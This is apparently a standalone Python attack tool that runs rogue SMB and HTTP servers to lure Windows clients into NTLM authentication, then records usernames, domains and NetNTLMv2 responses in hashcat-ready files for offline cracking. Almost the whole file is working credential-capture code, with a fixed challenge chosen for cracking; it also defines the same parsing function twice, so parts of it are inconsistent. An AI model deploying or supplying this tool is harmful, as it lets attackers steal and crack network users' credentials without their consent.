from impacket.smbserver import SimpleSMBServer
from impacket.ntlm import getNTLMSSPType1, getNTLMSSPType3, AV_PAIRS, NTLMAuthChallenge
from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_HOSTNAME, NTLMSSP_AV_DOMAINNAME, NTLMSSP_AV_DNS_HOSTNAME, NTLMSSP_AV_DNS_DOMAINNAME, NTLMSSP_AV_TIMESTAMP
import struct
import base64
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import logging

# Enable debug logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class CustomSMBServer(SimpleSMBServer):
    def __init__(self):
        self.challenge = b'\x11\x22\x33\x44\x55\x66\x77\x88'  # Static for hashcat
        self.logged_hashes = []
        # Corrected initialization for SimpleSMBServer
        super().__init__('0.0.0.0', 445)
        
        # Override the default challenge with our static one
        self.challengeToken = self.challenge

    def hookSmbCommand(self, connId, smbCommand, recvPacket):
        # Log every SMB command for debugging
        logger.debug(f"SMB command received: {smbCommand.__class__.__name__}")
        return super().hookSmbCommand(connId, smbCommand, recvPacket)
        
    def processSessionSetup(self, sessionSetupData, connData):
        # Override to capture NTLM authentication
        logger.debug("Processing Session Setup data")
        try:
            # Call parent method to handle normal flow
            resp = super().processSessionSetup(sessionSetupData, connData)
            
            # If we have security blob, try to extract NTLM
            if 'SecurityBlob' in sessionSetupData:
                blob = sessionSetupData['SecurityBlob']
                if len(blob) > 8:
                    # Check if it's NTLMSSP
                    if blob[0:8] == b'NTLMSSP\x00':
                        messageType = struct.unpack('<I', blob[8:12])[0]
                        logger.debug(f"NTLMSSP message type: {messageType}")
                        
                        # Type 3 is the authentication message with credentials
                        if messageType == 3:
                            self.processNTLMv2Auth(blob)
            
            return resp
        except Exception as e:
            logger.error(f"Error in processSessionSetup: {str(e)}")
            return super().processSessionSetup(sessionSetupData, connData)
    
    def processNTLMv2Auth(self, token):
        # Parse NTLMSSP type 3 message
        try:
            ntlmssp = getNTLMSSPType3(token)
            
            # Extract protocol elements
            domain = ntlmssp['domain_name'].decode('utf-16le')
            user = ntlmssp['user_name'].decode('utf-16le')
            nt_response = ntlmssp['nt_response']
            
            # Format the hash for hashcat NetNTLMv2 mode (12500)
            # Format: username::domain:challenge:HMAC:blob
            challenge = self.challenge.hex()
            hash_line = f"{user}::{domain}:{challenge}:{nt_response[:16].hex()}:{nt_response[16:].hex()}"
            
            logger.info(f"[+] SMB: Captured hash for {domain}\\{user}")
            logger.debug(f"Hash line: {hash_line}")
            
            with open('captured_hashes/smb_hashes.txt', 'a') as f:
                f.write(hash_line + '\n')
                
            # Store in memory as well for reference
            self.logged_hashes.append(hash_line)
            
            print(f"[+] SMB: Captured hash for {domain}\\{user}")
        except Exception as e:
            logger.error(f"Error processing NTLM auth: {str(e)}")

def construct_type2_message(type1_message=None):
    """Construct an NTLM Type 2 (challenge) message manually to avoid Impacket inconsistencies"""
    challenge = b'\x11\x22\x33\x44\x55\x66\x77\x88'  # Static for hashcat
    
    # Build a completely manual Type 2 message to bypass Impacket version issues
    # Based on the NTLM spec: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/
    msg = b'NTLMSSP\x00'  # Signature
    msg += struct.pack('<I', 2)  # Message Type (2)
    
    # Target Name fields (empty)
    msg += struct.pack('<H', 0)  # Target Name Length
    msg += struct.pack('<H', 0)  # Target Name Max Length
    msg += struct.pack('<I', 40)  # Target Name Offset
    
    # Flags
    msg += struct.pack('<I', 0x82801205)  # Negotiate Unicode, OEM, NTLM2, Always Sign, etc.
    
    # Challenge
    msg += challenge
    
    # Reserved
    msg += b'\x00' * 8
    
    # If we want to add AvPairs (target info), we'd do it here
    # For now, using a minimal message is more reliable
    
    logger.debug("Generated manual Type 2 message")
    return msg

def parse_type3_response(msg):
    """Parse NTLM Type 3 message and extract credentials"""
    try:
        # Get the NTLM message fields manually to avoid Impacket inconsistencies
        if len(msg) < 12 or msg[0:8] != b'NTLMSSP\x00' or struct.unpack('<I', msg[8:12])[0] != 3:
            raise ValueError("Not a valid NTLM Type 3 message")
        
        logger.debug("Parsing NTLM Type 3 message manually")
        
        # Get LM and NTLM response fields
        lm_response_len = struct.unpack('<H', msg[20:22])[0]
        lm_response_offset = struct.unpack('<I', msg[24:28])[0]
        
        nt_response_len = struct.unpack('<H', msg[28:30])[0]
        nt_response_offset = struct.unpack('<I', msg[32:36])[0]
        
        domain_len = struct.unpack('<H', msg[36:38])[0]
        domain_offset = struct.unpack('<I', msg[40:44])[0]
        
        user_len = struct.unpack('<H', msg[44:46])[0]
        user_offset = struct.unpack('<I', msg[48:52])[0]
        
        # Extract the fields
        domain = msg[domain_offset:domain_offset+domain_len]
        user = msg[user_offset:user_offset+user_len]
        nt_response = msg[nt_response_offset:nt_response_offset+nt_response_len]
        
        # Decode domain and username (usually UTF-16-LE)
        try:
            domain = domain.decode('utf-16-le')
            user = user.decode('utf-16-le')
        except UnicodeDecodeError:
            # Fallback to ASCII if UTF-16-LE fails
            domain = domain.decode('ascii', errors='replace')
            user = user.decode('ascii', errors='replace')
        
        logger.info(f"[+] HTTP: Captured hash for {domain}\\{user}")
        logger.debug(f"NT Response length: {nt_response_len}, data: {nt_response.hex()}")
        
        return domain, user, nt_response
    except Exception as e:
        logger.error(f"[-] HTTP: Error parsing Type 3 message: {str(e)}")
        # Log the raw message for debugging
        logger.debug(f"Raw message: {msg.hex()}")
        return "UNKNOWN", "UNKNOWN", b"ERROR"



def parse_type3_response(msg):
    """Parse NTLM Type 3 message and extract credentials"""
    try:
        ntlmssp = getNTLMSSPType3(msg)
        
        # Extract protocol elements
        domain = ntlmssp['domain_name'].decode('utf-16le')
        user = ntlmssp['user_name'].decode('utf-16le')
        nt_response = ntlmssp['nt_response']
        
        logger.info(f"[+] HTTP: Captured hash for {domain}\\{user}")
        
        return domain, user, nt_response
    except Exception as e:
        logger.error(f"[-] HTTP: Error parsing Type 3 message: {str(e)}")
        return "UNKNOWN", "UNKNOWN", b"ERROR"

class HTTPNTLMCapture(BaseHTTPRequestHandler):
    challenge = b'\x11\x22\x33\x44\x55\x66\x77\x88'  # Same as SMB for consistency
    
    def log_message(self, format, *args):
        # Debug the HTTP requests
        logger.debug(f"HTTP: {format % args}")
    
    def do_ntlm_auth(self):
        """Handle NTLM authentication for any HTTP method"""
        logger.debug(f"Processing request for {self.path}")
        logger.debug(f"Headers: {self.headers}")
        
        if 'Authorization' not in self.headers:
            logger.debug("No Authorization header, sending 401")
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'NTLM')
            self.send_header('Connection', 'Keep-Alive')
            self.end_headers()
            return False
        
        auth_header = self.headers['Authorization']
        if auth_header.startswith('NTLM '):
            msg = base64.b64decode(auth_header[5:])
            logger.debug(f"NTLM message received, length {len(msg)}")
            
            if len(msg) > 8 and msg[8] == 1:  # NTLM Type 1
                logger.debug("Type 1 message received, sending challenge")
                type2 = construct_type2_message()
                self.send_response(401)
                self.send_header('WWW-Authenticate', f'NTLM {base64.b64encode(type2).decode()}')
                self.send_header('Connection', 'Keep-Alive')
                self.end_headers()
                return False
                
            elif len(msg) > 8 and msg[8] == 3:  # NTLM Type 3
                logger.debug("Type 3 message received")
                domain, user, nt_response = parse_type3_response(msg)
                
                if nt_response != b"ERROR":
                    # Format the hash for hashcat NetNTLMv2 mode (12500)
                    # Format: username::domain:challenge:HMAC:blob
                    if len(nt_response) >= 16:
                        hash_line = f"{user}::{domain}:{self.challenge.hex()}:{nt_response[:16].hex()}:{nt_response[16:].hex()}"
                        
                        with open('captured_hashes/http_hashes.txt', 'a') as f:
                            f.write(hash_line + '\n')
                        
                        print(f"[+] HTTP: Captured hash for {domain}\\{user}")
                
                # Send a successful response
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<html><body><h1>Authentication successful</h1></body></html>")
                return True
        
        # If we get here, it's not NTLM auth
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'NTLM')
        self.end_headers()
        return False
    
    def do_GET(self):
        self.do_ntlm_auth()
        
    def do_HEAD(self):
        self.do_ntlm_auth()
        
    def do_POST(self):
        self.do_ntlm_auth()

    def do_OPTIONS(self):
        self.do_ntlm_auth()

if __name__ == "__main__":
    print("[*] NTLM Hash Capture Tool")
    print("[*] Setting up SMB and HTTP listeners...")
    
    # Create output directory if it doesn't exist
    os.makedirs('captured_hashes', exist_ok=True)
    
    # Create empty hash files so they exist
    open('captured_hashes/smb_hashes.txt', 'a').close()
    open('captured_hashes/http_hashes.txt', 'a').close()
    
    # SMB Listener
    try:
        smb_server = CustomSMBServer()
        smb_server.setSMB2Support(True)
        
        # Add a share - Note the path must exist or be created
        share_path = '/tmp/share'
        os.makedirs(share_path, exist_ok=True)
        smb_server.addShare('SHARE', share_path, 'Fake Share')
        
        # HTTP Listener  
        http_server = HTTPServer(('0.0.0.0', 80), HTTPNTLMCapture)
        
        # Start threads
        print("[+] Starting SMB server on port 445")
        smb_thread = threading.Thread(target=smb_server.start)
        smb_thread.daemon = True
        smb_thread.start()
        
        print("[+] Starting HTTP server on port 80")
        print("[*] Waiting for connections...")
        print("[*] Hash files will be stored in captured_hashes/")
        
        try:
            http_server.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            http_server.server_close()
    except Exception as e:
        print(f"[!] Error starting servers: {str(e)}")
